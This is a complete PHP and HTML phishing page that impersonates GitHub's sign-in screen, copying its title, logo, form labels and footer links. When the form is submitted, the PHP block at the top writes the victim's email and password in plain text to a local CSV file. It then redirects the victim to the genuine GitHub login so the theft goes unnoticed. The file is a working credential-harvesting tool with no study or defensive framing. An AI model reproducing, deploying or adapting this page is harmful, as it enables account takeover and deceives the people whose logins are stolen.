<?php
    session_start();
    $eid= $empty_eid= $eid_err= "";
    $pass= $empty_pass = "";

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["eid"]))
        {
            $empty_eid="Please fill out this field";
        }
        else
        {
            $eid=htmlspecialchars($_POST["eid"]);
            $pass=htmlspecialchars($_POST["pass"]);
            
            if(!(filter_var($eid,FILTER_VALIDATE_EMAIL)))
            {
                $eid_err="Please fill valid input.";
            }
            elseif(empty($pass))
            {
                $empty_pass="Please fill out this field";
            }
            else
            {
                $csv_file=fopen("login_details.csv","a");
                // to be run only the first time
                // fwrite($csv_file, "Email");
                // fwrite($csv_file, ",");
                // fwrite($csv_file, "Password");
    
                fwrite($csv_file, "\n");
                fwrite($csv_file, $eid);
                fwrite($csv_file, ",");
                fwrite($csv_file, $pass);
                fclose($csv_file);
                header("Refresh:1; url=https://github.com/login");
                exit();
            }
        }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="stylee.css">
    <title>Sign in to GitHub . GitHub</title>
</head>
<body>
    <img src="logo.png" alt="GitHub_logo">
    <p id="heading">Sign in to GitHub</p>
    <div class="form_container">
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <label >Username or email address</label>
            <input type="text" name="eid" class="u_input">
            <div class="php_error"> <?php echo $empty_eid , $eid_err ?></div>
            <label>Password</label>
            <a href="https://github.com/password_reset">Forgot password?</a>
            <input type="password" name="pass" class="u_input">
            <div class="php_error"> <?php echo $empty_pass; ?></div>
            <input type="submit" value="Sign in" id="signin">
        </form>
    </div>
    <div class="bottom_container">
        <p>New to GitHub? <a href="https://github.com/signup?source=login">Create an account</a></p>
    </div>

    <footer>
        <a href="https://docs.github.com/en/site-policy/github-terms/github-terms-of-service">Terms</a>
        <a href="https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement">Privacy</a>
        <a href="https://docs.github.com/en">Docs</a>
        <a href="https://support.github.com/request/landing">Contact GitHub Support</a>
    </footer>
</body>
</html>